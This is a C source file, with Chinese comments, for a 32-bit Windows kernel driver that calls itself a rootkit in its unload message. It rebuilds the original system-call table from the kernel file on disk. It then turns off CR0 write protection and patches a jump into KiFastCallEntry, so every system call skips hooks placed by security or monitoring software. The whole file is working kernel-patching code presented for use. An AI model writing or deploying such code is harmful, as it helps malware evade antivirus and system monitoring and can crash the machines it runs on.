
```c
#include "kernelfun.h"
#include <ntimage.h>

#define SEC_IMAGE    0x01000000

typedef struct {
    WORD    offset:12;
    WORD    type:4;
} IMAGE_FIXUP_ENTRY, *PIMAGE_FIXUP_ENTRY;

DWORD *oldssdt;
DWORD patchAddress;
DWORD nowSsdt;
PVOID lpRet;

//得到系统内核模块基址
DWORD FoundSystemModule(BOOL bKernel,char *sysFileName)
{
    DWORD    dwNeededSize,rc;
    PMODULES    pModules=(PMODULES)&pModules;
    PCHAR    pKernelName;
    DWORD kernelBase;
    DWORD i;

    rc=ZwQuerySystemInformation(SystemModuleInformation,pModules,4,&dwNeededSize);
    if (rc==STATUS_INFO_LENGTH_MISMATCH) 
    {
        pModules=(MODULES *)ExAllocatePool(PagedPool,dwNeededSize);
        rc=ZwQuerySystemInformation(SystemModuleInformation,pModules,dwNeededSize,NULL);
        if (!NT_SUCCESS(rc))
        {
            DbgPrint("ZwQuerySystemInformation failed");
            return 0;
        }
    } 
    else
    {
        DbgPrint("ZwQuerySystemInformation failed");
        return 0;
    }

    if(bKernel)
    {
        pKernelName=pModules->smi[0].ModuleNameOffset+pModules->smi[0].ImageName;
        strcpy(sysFileName,pKernelName);
        kernelBase=(DWORD)pModules->smi[0].Base;
        return kernelBase;
    }
    for (i=0;(pModules->dwNumberOfModules)>i;i++)
    {
        pKernelName=pModules->smi[i].ModuleNameOffset+pModules->smi[i].ImageName;
        if(_stricmp(pKernelName,sysFileName)==0)
        {
            kernelBase=(DWORD)pModules->smi[i].Base;
            return kernelBase;
        }
    }

    return 0;
}

//得到并保存原始的ssdt
BOOL SaveOldSddt(PVOID hModule,DWORD dwKSDT,DWORD dwKernelBase)
{
    PDWORD    pService;
    DWORD dwKiServiceTable;

    IMAGE_DOS_HEADER *dosHeader;
    IMAGE_NT_HEADERS *ntHeader;
    PIMAGE_BASE_RELOCATION    pbr;
    PIMAGE_FIXUP_ENTRY    pfe;  
    DWORD dwPointer;
    DWORD point;
    BOOL    bFirstChunk=TRUE;
    DWORD i;

    dosHeader=(IMAGE_DOS_HEADER*)hModule;

    ntHeader=(IMAGE_NT_HEADERS*)((DWORD)hModule+dosHeader->e_lfanew);

    pbr=(PIMAGE_BASE_RELOCATION )(ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress+(DWORD)hModule);
    pfe=(PIMAGE_FIXUP_ENTRY)((DWORD)pbr+sizeof(IMAGE_BASE_RELOCATION));
    while(bFirstChunk||pbr->VirtualAddress)
    {
        bFirstChunk=FALSE;

        for (i=0;((pbr->SizeOfBlock-8)/2)>i;i++)
        {
            if(pfe->type==IMAGE_REL_BASED_HIGHLOW)
            {
                dwPointer=pbr->VirtualAddress+pfe->offset;

                point=*(DWORD*)(dwPointer+(DWORD)hModule)-(DWORD)ntHeader->OptionalHeader.ImageBase;
                if(point==dwKSDT)
                {
                    if(*(USHORT*)(dwPointer+(DWORD)hModule-2)==0x05c7)
                    {
                        dwKiServiceTable=*(PDWORD)((DWORD)hModule+dwPointer+4)-ntHeader->OptionalHeader.ImageBase;
                        i=0;
                        for (pService=(PDWORD)((DWORD)hModule+dwKiServiceTable);
                            *pService-ntHeader->OptionalHeader.ImageBase<ntHeader->OptionalHeader.ImageBase;
                            pService++,i++)
                        {
                            oldssdt[i]=*pService-ntHeader->OptionalHeader.ImageBase+dwKernelBase;
                        }
                    }
                }
            }
            pfe++;
        }
        pbr=(PIMAGE_BASE_RELOCATION)((DWORD)pbr+pbr->SizeOfBlock);
        pfe=(PIMAGE_FIXUP_ENTRY)((DWORD)pbr+sizeof(IMAGE_BASE_RELOCATION));
    }

    return TRUE;
}

//计算mov [rem],rem的[rem]
DWORD GetFlag(PVOID lpBase)
{
    IMAGE_DOS_HEADER *dosHeader;
    IMAGE_NT_HEADERS *ntHeader;
    IMAGE_EXPORT_DIRECTORY* exportTable;
    DWORD* pfunctionAddresses;
    DWORD* pfunctionNames;
    WORD* pfunctionOrdinals;
    DWORD functionOrdinal;
    DWORD Base, i, functionAddress;
    DWORD dwKSDT;
    char* functionName;

    dosHeader=(IMAGE_DOS_HEADER*)lpBase;
    ntHeader=(IMAGE_NT_HEADERS*)((DWORD)lpBase+dosHeader->e_lfanew);
    exportTable=(IMAGE_EXPORT_DIRECTORY*)((DWORD)lpBase+ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    pfunctionAddresses=(DWORD*)((DWORD)lpBase+exportTable->AddressOfFunctions);
    pfunctionNames=(DWORD*)((DWORD)lpBase+exportTable->AddressOfNames);
    pfunctionOrdinals=(WORD*)((DWORD)lpBase+exportTable->AddressOfNameOrdinals);
    Base=exportTable->Base;
    for(i=0;i<exportTable->NumberOfFunctions;i++)
    {
        functionName=(char*)((DWORD)lpBase+pfunctionNames[i]);
        functionOrdinal=pfunctionOrdinals[i]+Base-1;
        functionAddress = (DWORD)( (DWORD)lpBase + pfunctionAddresses[functionOrdinal]);
        if(_stricmp(functionName,"KeServiceDescriptorTable")==0)
        {
            dwKSDT=functionAddress-(DWORD)lpBase;
            return dwKSDT;
        }
    }
    return 0;
}

//映射文件进内存得到ssdt并保存起来
BOOL GetOldSsdt(PUNICODE_STRING kernelFileName,DWORD kernelBase) 
{
    NTSTATUS status;
    HANDLE  hSection, hFile;
    DWORD dwKSDT;
    PVOID BaseAddress = NULL;
    SIZE_T size=0;
    IO_STATUS_BLOCK iosb;
    OBJECT_ATTRIBUTES oa = {sizeof oa, 0, kernelFileName, OBJ_CASE_INSENSITIVE};

    status=ZwOpenFile(&hFile, FILE_EXECUTE | SYNCHRONIZE, &oa, &iosb, FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);
    if(!NT_SUCCESS(status))
    {
        DbgPrint("ZwOpenFile failed\n");
        return FALSE;
    }
    oa.ObjectName = 0;

    status=ZwCreateSection(&hSection, SECTION_ALL_ACCESS, &oa, 0,PAGE_EXECUTE, SEC_IMAGE, hFile);
    if(!NT_SUCCESS(status))
    {
        DbgPrint("ZwCreateSection failed\n");
        return FALSE;
    }

    status=ZwMapViewOfSection(hSection, NtCurrentProcess(), &BaseAddress, 0, 1000, 0, &size, (SECTION_INHERIT)1, MEM_TOP_DOWN, PAGE_READWRITE); 
    if(!NT_SUCCESS(status))
    {
        DbgPrint("ZwMapViewOfSection failed\n");
        return FALSE;
    }
    ZwClose(hFile);

    dwKSDT=GetFlag(BaseAddress);
    if(dwKSDT==0)
    {
        DbgPrint("GetFlag failed\n");
        return FALSE;
    }
    DbgPrint("dwKSDT:%x\n",dwKSDT);
    if(!SaveOldSddt(BaseAddress,dwKSDT,kernelBase))
    {
        DbgPrint("GetOldSddt failed\n");
        return FALSE;
    }

    ZwClose(hSection);
    return TRUE;
}

//构建新的Ssdt
BOOL SetNewSsdt()
{
    UNICODE_STRING kernelFileName;
    char systemFile[80];
    DWORD kernelBase;
    int count;

    kernelBase=FoundSystemModule(TRUE,systemFile);
    if(kernelBase==0)
    {
        DbgPrint("get kernel base failed\n");
        return FALSE;
    } 
    if(_stricmp(systemFile,"ntkrnlpa.exe")==0)
    {
        RtlInitUnicodeString(&kernelFileName, L"\\Device\\HarddiskVolume1\\Windows\\System32\\ntkrnlpa.exe");
    }
    else if(_stricmp(systemFile,"ntoskrnl.exe")==0)
    {
        RtlInitUnicodeString(&kernelFileName, L"\\Device\\HarddiskVolume1\\Windows\\System32\\ntoskrnl.exe");
    }
    else
    {
        return FALSE;
    }
    count=KeServiceDescriptorTable->NumberOfServices;
    nowSsdt=(DWORD)KeServiceDescriptorTable->ServiceTableBase;
    oldssdt=(DWORD*)ExAllocatePool(NonPagedPool,count*4);
    if(oldssdt==NULL)
    {
        DbgPrint("allocate memory failed\n");
        return FALSE;
    }
    KdPrint(("oldssdt:%X\n",oldssdt));

    if(!GetOldSsdt(&kernelFileName,kernelBase))
    {
        DbgPrint("save ssdt failed\n");
        return FALSE;
    }
    return TRUE;
}

__declspec(naked)void UseOldSsdt()
{
    _asm
    {
        pushfd ;
        pushad ;
        mov  eax,nowSsdt;
        cmp eax,[edi];
        jnz shadow;//判断是不是shadow ssdt
        popad;
        popfd;
        mov     cl,byte ptr [eax+ebx];
        mov     edi,oldssdt;
        jmp [lpRet];        
shadow:
        popad;
        popfd;
        mov     cl,byte ptr [eax+ebx];
        mov     edi,dword ptr [edi];
        jmp [lpRet];
    }
};

BOOL HookKiFastCallEntry(BOOL bHook)
{
    BYTE jmpCode[5]={0xe9,0x00,0x00,0x00,0x00};
    BYTE oldCode[5]={0x8a,0x0c,0x18,0x8b,0x3f};
    BYTE *functionAddress;
    int i;

    if(bHook)
    {
        _asm
        {
            pushad;
            mov ecx, 0x176;
            rdmsr;
            mov functionAddress, eax;
            popad;
        }
        for(i=0;i<264;i++)
        {
            if(memcmp(&functionAddress[i],oldCode,5)==0)
            {
                patchAddress=(DWORD)&functionAddress[i];
                KdPrint(("patch address:%X\n",patchAddress));
                break;
            }
        }
        if(i==264)
            return FALSE;
        *(DWORD*)&jmpCode[1]=(DWORD)UseOldSsdt-(patchAddress+5);
        lpRet=(PVOID)(patchAddress+5);
        _asm
        {
            CLI  ;                 
            MOV    EAX, CR0  ;    
            AND EAX, NOT 10000H ;
            MOV    CR0, EAX;        
        }
        memcpy((PVOID)patchAddress,jmpCode,5);
        _asm 
        {
            MOV    EAX, CR0;        
            OR    EAX, 10000H;            
            MOV    CR0, EAX ;              
            STI;                    
        }
    }
    else
    {
        _asm
        {
            CLI  ;                 
            MOV    EAX, CR0  ;    
            AND EAX, NOT 10000H ;
            MOV    CR0, EAX;        
        }
        memcpy((PVOID)patchAddress,oldCode,5);
        _asm 
        {
            MOV    EAX, CR0;        
            OR    EAX, 10000H;            
            MOV    CR0, EAX ;              
            STI;                    
        }
    }
    return TRUE;
}

VOID OnUnload( IN PDRIVER_OBJECT DriverObject )
{    
    HookKiFastCallEntry(FALSE);
    DbgPrint("ROOTKIT: OnUnload called\n");
}

NTSTATUS DriverEntry( IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath )
{
    theDriverObject->DriverUnload = OnUnload;
    if(SetNewSsdt())
    {
        HookKiFastCallEntry(TRUE);
    }

    return STATUS_SUCCESS;
}
```
